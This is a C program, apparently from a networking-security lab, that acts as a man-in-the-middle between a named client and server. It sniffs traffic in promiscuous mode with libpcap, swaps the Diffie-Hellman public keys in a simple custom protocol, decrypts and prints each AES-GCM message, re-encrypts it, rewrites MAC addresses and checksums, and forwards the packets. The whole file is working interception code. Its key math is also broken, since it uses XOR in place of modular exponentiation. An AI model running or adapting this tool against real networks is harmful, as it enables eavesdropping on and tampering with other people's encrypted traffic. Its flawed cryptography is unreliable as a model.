#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <net/ethernet.h>
#include "my_random.h"

#define MAX 2048


typedef struct IP_T
{
    unsigned char client_ip[16];
    unsigned char server_ip[16];
    pcap_t *p;
} IP_T;

typedef struct psd_header
{
    unsigned int saddr;
    unsigned int daddr;
    char must_be_zero;      // 保留字，强制置空
    char protocol;          // 协议类型
    unsigned short tcp_len; // TCP长度
} psd_header;

struct middle_Key
{
    int p, g, Pa, Pb; //first key
    int Pa1, Pb1;  //middle key  , caculate later
    int key2client;     //AES key to client
    int key2server;	//AES key to server
    int a1 , b1;
    char init_iv2client[64];
    char secret_key2client[256];
    char init_iv2server[64];
    char secret_key2server[256];
} key;



void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *packet);
uint16_t calc_checksum(void *pkt, int len);
void set_psd_header(struct psd_header *ph, struct iphdr *ip, uint16_t tcp_len);

int main(int argc, char **argv)
{
    gcm_initialize();
    if (argc != 3)
    {
        printf("USAGE: ./middle ClientIP ServerIP");
        return 0;
    }
    printf("middle is running!\n");
    //daemon(1, 1); // 后台运行
    pcap_t *descr = NULL; // 数据包捕获描述字
    int i = 0, cnt = 0;
    char errbuf[PCAP_ERRBUF_SIZE]; // 存放错误信息
    char *device = NULL;           // 网络设备名指针
    bzero(errbuf, PCAP_ERRBUF_SIZE);
    struct bpf_program filter; // BPF过滤规则
    // 初始化gmp变量
//    mpz_inits(middle_dh.p, middle_dh.g, middle_dh.pri_key, middle_dh.pub_key,
//              middle_dh.key2client, middle_dh.key2server, NULL);
//    mpz_set_ui(middle_dh.g, (unsigned long int)5); // g=5

    // 得到要捕获的第一个网络设备名称
    if ((device = pcap_lookupdev(errbuf)) == NULL)
    {
        fprintf(stderr, "ERROR at pcap_lookupdev(): %s\n", errbuf);
        exit(1);
    }
    printf("网络设备名称：%s\n", device);

    // 混杂模式打开网络设备(即捕获每一个流经网卡的数据包，无论是否发给自己)
    if ((descr = pcap_open_live(device, MAX, 1, 512, errbuf)) == NULL)
    {
        fprintf(stderr, "ERROR at pcap_open_live(): %s\n", errbuf);
        exit(1);
    }
    //printf("打开%s成功！\n", device);

    // 设置BPF过滤规则
    char rule[128];
    memset(rule, 0, 128);
    strncat(rule, "(src host ", 18);
    strncat(rule, argv[1], strlen(argv[1])); // (src host ClientIP
    strncat(rule, " and dst host ", 14);
    strncat(rule, argv[2], strlen(argv[2])); // and dst host ServerIP
    strncat(rule, ") or (src host ", 23);
    strncat(rule, argv[2], strlen(argv[2])); // ) or ( src host ServerIP
    strncat(rule, " and dst host ", 14);
    strncat(rule, argv[1], strlen(argv[1])); // and dst host ClientIP
    strncat(rule, ")", 1);
    printf("%s\n", rule);
    // (tcp and src host ClientIP and dst host ServerIP) or
    // (tcp and src host ServerIP and dst host ClientIP)

    // 将IP写入文件
    FILE *fp;
    fp = fopen("./middle.txt", "w");
    fputs("客户端IP: ", fp);
    fputs(argv[1], fp);
    fputs("\n服务器IP: ", fp);
    fputs(argv[2], fp);
    fputs("\n\n", fp);
    fclose(fp);

    // 将BPF过滤规则编译到filter结构体
    if (pcap_compile(descr, &filter, rule, 1, 0) < 0)
    {
        fprintf(stderr, "ERROR at pcap_compile()\n");
        exit(1);
    }

    // 应用过滤规则
    if (pcap_setfilter(descr, &filter) < 0)
    {
        fprintf(stderr, "ERROR at pcap_setfilter()\n");
        exit(1);
    }

    // 存储客户端、服务器的IP, 数据报捕获描述字
    IP_T ip_t;
    ip_t.p = descr;
    bzero(ip_t.client_ip, 15);
    memcpy(ip_t.client_ip, argv[1], strlen(argv[1]));
    bzero(ip_t.server_ip, 15);
    memcpy(ip_t.server_ip, argv[2], strlen(argv[2]));

    // 循环抓包并按照函数proccess_pkt处理, ip_t为参数
    if (pcap_loop(descr, -1, process_pkt, (u_char *)&ip_t) == -1)
    {
        fprintf(stderr, "ERROR at pcap_loop()\n");
        exit(1);
    }

//    mpz_clears(middle_dh.p, middle_dh.g, middle_dh.pri_key, middle_dh.pub_key,
//               middle_dh.key2client, middle_dh.key2server, NULL);
    return 0;
}

// 每抓到一个数据报后的回调函数
void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
    unsigned char src_ip[16];                                          // 源IP
    unsigned char server_mac[] = {0x00, 0x0c, 0x29, 0x19, 0x83, 0x9b}; // 服务器mac ubuntu 64 00:0c:29:19:83:9b
    unsigned char middle_mac[] = {0x00, 0x0c, 0x29, 0x7a, 0x04, 0xfd}; // 中间人mac kali      00:0c:29:7a:04:fd
    unsigned char client_mac[] = {0x00, 0x0c, 0x29, 0x17, 0xa1, 0x50}; // 客户端mac ubuntu    00:0c:29:17:a1:50
    
    

    struct ether_header *ethernet = (struct ether_header *)(packet); // 以太网帧头部
    struct iphdr *ip = (struct iphdr *)(packet + ETHER_HDR_LEN);     //IP头
    struct tcphdr *tcp = (struct tcphdr *)(packet + ETHER_HDR_LEN +
                                           sizeof(struct iphdr)); //tcp头
    int header_len = ETHER_HDR_LEN + sizeof(struct iphdr) +
                     sizeof(struct tcphdr) + 12; // 数据包头部长度
    int data_len = pkthdr->len - header_len;     // 数据包数据真实长度
    bzero(src_ip, 16);
    inet_ntop(AF_INET, &(ip->saddr), src_ip, 16); // 源地址存入src_ip
    memcpy(ethernet->ether_shost, middle_mac, 6); // 用中间人MAC替换源地址MAC
    FILE *fp;                                     // 文件指针
    fp = fopen("./middle.txt", "a");
    // 若捕获到的是客户端发出的数据包
    if (strncmp(src_ip, ip_t->client_ip, strlen(src_ip)) == 0)
    {
        // 若发送的是客户端公钥，则先计算出对客户端的密钥
        // 然后生成自己的私钥，并计算公钥发送给服务器
        if (strncmp(packet + header_len, "pgPa", 4) == 0)
        {
             printf("抓到客户端公钥！\n\n");
            // 保存客户端公钥
            char data[40] = {""};
            int a[3] = {0};
            strncpy(data,packet + header_len +4,20);
            char * data1 = strtok(data ,"|");
            int datalen = strlen(data1);
            printf("data1 is %s\n",data1);
            char * token = strtok(data1 , " ");
            for(int i = 0;i<3;i++)
            {
                a[i] = atoi(token);
                token = strtok(NULL," ");
            }
            key.p = a[0];
            key.g = a[1];
            key.Pa = a[2];
            key.a1 = createprime(1,key.p-1);
            key.b1 = createprime(1000,key.p-1);
            printf("a1 is %d\nb1 is %d\n",key.a1,key.b1);
            key.Pa1 = ((key.g)^(key.a1)%(key.p));
            key.Pb1 = ((key.g)^(key.b1)%(key.p));
            printf("p  =  %d\ng  =  %d\nPa  =  %d\n",key.p,key.g,key.Pa);
            printf("Pa1  =  %d\nPb1  =  %d\n",key.Pa1,key.Pb1);
            // caculate key2client
            key.key2client = ((key.Pa)^(key.b1)%(key.p));
            printf("key2client is %d\n\n",key.key2client);
            //caculate key
            get_key(key.secret_key2client,key.init_iv2client,key.key2client);
//            printf("secret_key2client  is  %s\n",key.secret_key2client);
//            printf("init_iv2client  is  %s\n",key.init_iv2client);
            memset(data,0x00,sizeof(char)*40);
            snprintf(data,40,"pgPa%d %d %d",key.p,key.g,key.Pa1);
//            printf("data is %s\n",data);
//            printf("data len is %d\n",strlen(data));
            snprintf(packet + header_len ,strlen(data)+1, "%s",data);
            // 重新计算校验和
            uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
            unsigned char *data_for_checksum = (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
            struct psd_header ph;
            bzero(data_for_checksum, tcp_len + sizeof(ph));
            set_psd_header(&ph, ip, tcp_len);
            memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
            tcp->check = 0;
            memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
            u_int16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
            tcp->check = checksum;
            // printf("已对客户端公钥进行处理！\n\n");
        }
        // 若发送的是加密消息
        else if (strncmp(packet + header_len, "msg", 3) == 0)
        {
            printf("client2server msg is catched\n");
/*            printf("key.a1 is %d\n",key.a1);
            printf("secret_key2client  is  %s\n",key.secret_key2client);
            printf("init_iv2client  is  %s\n",key.init_iv2client);
 */           
            unsigned char ciphertext[256];
            unsigned char plaintext[256];
            // printf("抓到客户端发往服务器的加密消息!\n\n");
            char data[256];
            memset(data,0x00,sizeof(char)*256);
            strncpy(data,packet + header_len + 3 , 256);
            // 解密消息，输出
            aes_gcm_decrypt(plaintext,data,sizeof(data),key.secret_key2client,256,key.init_iv2client,128);
            printf("client to server data is %s\n\n",plaintext);
            // 使用对服务器的密钥加密消息
            aes_gcm_encrypt(ciphertext,plaintext,sizeof (plaintext),key.secret_key2server,256,key.init_iv2server,128);
            strncpy(packet + header_len + 3,ciphertext, strlen(ciphertext));
            // 计算校验和
            uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
            unsigned char *data_for_checksum = (unsigned char *)malloc(
                tcp_len + sizeof(struct psd_header));
            struct psd_header ph;
            bzero(data_for_checksum, tcp_len + sizeof(ph));
            set_psd_header(&ph, ip, tcp_len);
            memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
            tcp->check = 0;
            memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
            uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
            tcp->check = checksum;
            // printf("已对客户端发往服务器的消息进行处理！\n\n");
        }
        // 以太网帧头部目的地设置为服务器MAC
        memcpy(ethernet->ether_dhost, server_mac, 6);
    }
    // 若捕获到的是服务器发出的数据包
    else if (strncmp(src_ip, ip_t->server_ip, strlen(src_ip)) == 0)
    {	
    	//printf("a server packet is catched!\n");
        // 若发送的是服务器公钥，保留公钥，计算对服务器的密钥
        // 并且需要生成中间人自己的私钥和公钥
        if (strncmp(packet + header_len, "Pb", 2) == 0)
        {
            // printf("已收到服务器公钥!\n");
            char data[40] = {""};
            strncpy(data,packet + header_len + 2 , 10);
            char * data1 = strtok(data ,"|");
            int datalen = strlen(data1);
            key.Pb = atoi(data1);
            printf("datalen is %d\n",datalen);
            printf("Pb is %d\n",key.Pb);
            key.key2server = ((key.Pb)^(key.a1)%(key.p));
            printf("key2server is %d\n\n",key.key2server);
            get_key(key.secret_key2server,key.init_iv2server,key.key2server);
//            printf("secret_key2server  is  %s\n",key.secret_key2server);
//            printf("init_iv2server  is  %s\n",key.init_iv2server);
            memset(data , 0x00 , sizeof(char)*40);
            snprintf(data , 39 , "%d" , key.Pb1);
            strncpy(packet + header_len + 2 , data ,strlen(data));
            // 重新计算校验和
            uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
            unsigned char *data_for_checksum = (unsigned char *)malloc(
                tcp_len + sizeof(struct psd_header));
            struct psd_header ph;
            bzero(data_for_checksum, tcp_len + sizeof(ph));
            set_psd_header(&ph, ip, tcp_len);
            memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
            tcp->check = 0;
            memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
            uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
            tcp->check = checksum;
            // printf("已对服务器公钥进行处理！\n\n");
        }
        // 若发送的是加密消息
        else if (strncmp(packet + header_len, "msg", 3) == 0)
        {	
            printf("server2client msg is catched\n");
/*            printf("key.a1 is %d\n",key.a1);
            printf("secret_key2server  is  %s\n",key.secret_key2server);
            printf("init_iv2server  is  %s\n",key.init_iv2server);
 */
            unsigned char ciphertext[256];
            unsigned char plaintext[256];
            // printf("已收到服务器发往客户端的加密消息！\n\n");
            char data[256] = {""};
            memset(data,0x00,sizeof(char)*256);
            strncpy(data,packet + header_len + 3 , 256);
            // 解密消息，输出
            aes_gcm_decrypt(plaintext,data,sizeof(data),key.secret_key2server,256,key.init_iv2server,128);
            printf("server to client data is %s\n\n",plaintext);
            // 加密消息，使用对客户端的密钥
            aes_gcm_encrypt(ciphertext,plaintext,sizeof (plaintext),key.secret_key2client,256,key.init_iv2client,128);
            strncpy(packet + header_len + 3,ciphertext, strlen(ciphertext));
            // 计算校验和
            uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
            unsigned char *data_for_checksum = (unsigned char *)malloc(
                tcp_len + sizeof(struct psd_header));
            struct psd_header ph;
            bzero(data_for_checksum, tcp_len + sizeof(ph));
            set_psd_header(&ph, ip, tcp_len);
            memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
            tcp->check = 0;
            memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
            uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
            tcp->check = checksum;
            // printf("已对服务器发往客户端的加密消息进行处理!\n\n");
        }
        memcpy(ethernet->ether_dhost, client_mac, 6);
    }
    pcap_sendpacket(ip_t->p, packet, pkthdr->len);
    fclose(fp);
}

// 计算校验和并返回
uint16_t calc_checksum(void *pkt, int len)
{
    // 将TCP伪首部、首部、数据部分划分成16位的一个个16进制数
    uint16_t *buf = (uint16_t *)pkt;
    // 将校验和置为0，设置为32bit是为了保留下来16bit计算溢出的位
    uint32_t checksum = 0;
    // 对16位的数逐个相加，溢出的位加在最低位上
    while (len > 1)
    {
        checksum += *buf++;
        // 前半部分将溢出的位移到最低位，后半部分去掉16bit加法溢出的位（置0）
        checksum = (checksum >> 16) + (checksum & 0xffff);
        len -= 2;
    }
    if (len)
    {
        checksum += *((uint8_t *)buf); // 加上最后8位
        checksum = (checksum >> 16) + (checksum & 0xffff);
    }
    return (uint16_t)((~checksum) & 0xffff); // 取反
}

// 设置TCP数据包头部
void set_psd_header(struct psd_header *ph, struct iphdr *ip, uint16_t tcp_len)
{
    ph->saddr = ip->saddr;
    ph->daddr = ip->daddr;
    ph->must_be_zero = 0;
    ph->protocol = 6; // 6表示TCP
    ph->tcp_len = htons(tcp_len);
}
